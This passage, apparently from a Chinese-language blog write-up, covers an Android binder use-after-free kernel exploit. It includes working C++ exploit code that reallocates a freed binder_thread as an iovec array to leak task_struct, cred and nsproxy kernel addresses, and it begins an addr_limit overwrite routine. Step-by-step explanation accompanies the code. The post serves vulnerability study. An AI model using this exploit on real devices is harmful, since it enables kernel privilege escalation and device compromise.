+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Now link the poll wait queue to binder thread wait queue
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">linkEventPollWaitQueueToBinderThreadWaitQueue&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// We should trigger the unlink operation when we
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// have the binder_thread reallocated as iovec array
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Now fork
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">pid_t&lt;/span> &lt;span class="n">childPid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fork&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">childPid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// child process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// There is a race window between the unlink and blocking
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// in writev, so sleep for a while to ensure that we are
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// blocking in writev before the unlink happens
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Trigger the unlink operation on the reallocated chunk
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">unlinkEventPollWaitQueueFromBinderThreadWaitQueue&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// First interesting iovec will read 0x1000 bytes of data.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// This is just the junk data that we are not interested in
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesRead&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// parent process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// I have seen some races which hinders the reallocation.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// So, now freeing the binder_thread after fork.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">freeBinderThread&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Reallocate binder_thread as iovec array
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// We need to make sure this writev call blocks
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// This will only happen when the pipe is already full
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// This print statement was ruining the reallocation,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// spent a night to figure this out. Commenting the
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// below line.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// INFO(&amp;#34;[+] Reallocating binder_thread\n&amp;#34;);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">writev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IOVEC_COUNT&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// If the corruption was successful, the total bytes written
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// should be equal to 0x2000. This is because there are two
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// valid iovec and the length of each is 0x1000
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesWritten&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Wrote 0x%lx bytes&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesWritten&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Now read the actual data from the corrupted iovec
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// This is the leaked data from kernel address space
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// and will contain the task_struct pointer
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] read failed. nBytesRead: 0x%lx, expected: 0x%x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesRead&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Wait for the child process to exit
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">wait&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">int64_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">dataBuffer&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">TASK_STRUCT_OFFSET_IN_LEAKED_DATA&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m_pidAddress&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">int8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m_credAddress&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">int8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m_nsproxyAddress&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">int8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nsproxy&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Leaked task_struct: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m_task_struct&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] &amp;amp;task_struct-&amp;gt;pid: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m_pidAddress&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] &amp;amp;task_struct-&amp;gt;cred: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m_credAddress&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] &amp;amp;task_struct-&amp;gt;nsproxy: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m_nsproxyAddress&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>很好理解，exp这部分首先初始化环境之后创建用于readv和writev的pipe，readv和writev函数用于在一次函数调用中读、写多个非连续缓冲区。修改pipe的size为0x1000。&lt;/p>
+&lt;p>之后创建了25个iovec，放在iovecStack里面。25个是根据binder_thread和iovec的大小算出来&lt;/p>
+&lt;p>&lt;code>IOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))&lt;/code>&lt;/p>
+&lt;p>binder_thread结构体大小为408，25个iovec大小为25*16=400，正好。计算对比&lt;strong>binder_thread&lt;/strong>中wait.head的偏移0xA0和&lt;strong>iovecStack&lt;/strong>的偏移iovecStack[10].iov_len匹配。&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200629155854.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>前面动态调试时也能看到会有两个地址的值会被写入地址，这里相对应的位置为iovecStack[10].iov_len 和iovecStack[11].io_base。所以我们这里要修改iovecStack[10]的iov_len和pipe一样的大小，阻塞掉父进程的writev系统调用，再去触发unlink操作。&lt;/p>
+&lt;p>这里的iovecStack[10].io_base正好对上binder_thread-&amp;gt;wait.lock，如果这个值不为0的话，后面在尝试取自旋锁锁会出问题，不进行unlink操作，这个值是32bit的，iov_base是64bit的，所以要设置对齐，使用mmap保证低32bit为0。&lt;/p>
+&lt;p>iovecStack[10].iov_len和iovecStack[11].iov_len设置为pipe size的大小，iovecStack[11].io_base 设置为新分配的一个地址，&lt;/p>
+&lt;p>创建fork子进程进行EPOLL_CTL_DEL操作触发unlink。读出0x1000 bytes的垃圾数据恢复进程，&lt;/p>
+&lt;p>父进程free掉binder_thread，调用writev系统进行阻塞，等待子进程完成。&lt;/p>
+&lt;p>最后父进程在调用read读出已经被子进程覆盖了内核地址处的数据，根据偏移读出泄露的task_struct指针。&lt;/p>
+&lt;p>下面这张图是&lt;strong>Project Zero&lt;/strong> blog贴出来的流程图，方便理解整个过程。&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200629014014.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>既然已经有task_struct指针，接下来就可以patch 掉AddrLimit。直接看exp实现。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">BinderUaF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">clobberAddrLimit&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">sock_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>
